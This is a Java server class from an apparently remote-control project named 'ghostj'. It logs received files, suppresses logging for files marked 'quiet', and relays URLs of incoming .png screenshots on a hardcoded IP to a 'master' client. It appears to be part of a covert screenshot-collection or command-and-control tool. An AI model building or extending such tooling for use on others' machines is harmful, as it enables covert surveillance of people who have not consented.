package com.ghostj.server;

import com.ghostj.util.Out;
import com.rft.core.server.FileInfo;
import com.rft.core.server.TaskEvent;

public class FileReceiveEvent implements TaskEvent {
    @Override
    public void taskStarted(String token, FileInfo fileInfo) {
        if (!fileInfo.getName().contains("quiet")) {
            Out.say("FileReceiveEvent", "接收 " + fileInfo.getName() + " pa:" + fileInfo.getSavePath() + " size:" + fileInfo.getSize() + " token:" + token);
            Out.putPrompt();
        }
    }

    @Override
    public void taskFinished(String token, FileInfo fileInfo) {
        if (!fileInfo.getName().contains("quiet")) {
            Out.say("FileReceiveEvent", "成功 " + fileInfo.getName() + " pa:" + fileInfo.getSavePath() + " size:" + fileInfo.getSize() + " token:" + token);
        }
        //删除MASK标志
        String fileName=fileInfo.getSavePath() + "/" + fileInfo.getName();
        if(fileInfo.getName().endsWith(".png")&&!fileInfo.getName().contains("quiet")) {
            Out.say("HandleConn", "接收到新图片,url:http://39.100.5.139/ghost/" + ServerMain.fileReceiver.getRootPath() + fileName);
            ServerMain.sendToSpecificMaster("!scrd http://39.100.5.139/ghost/" + ServerMain.fileReceiver.getRootPath() + fileInfo.getSavePath() + "/" + fileInfo.getName() + "\n", "screenShot");
        }
        if (!fileInfo.getName().contains("quiet"))
            Out.putPrompt();
    }

    @Override
    public void taskInterrupted(String token, FileInfo fileInfo) {
        if (!fileInfo.getName().contains("quiet")) {
            Out.say("FileReceiveEvent", "文件被中断 name:" + fileInfo.getName() + " save:" + fileInfo.getSavePath() + " length:" + fileInfo.getSize() + " token:" + token);
            Out.putPrompt();
        }
    }
}
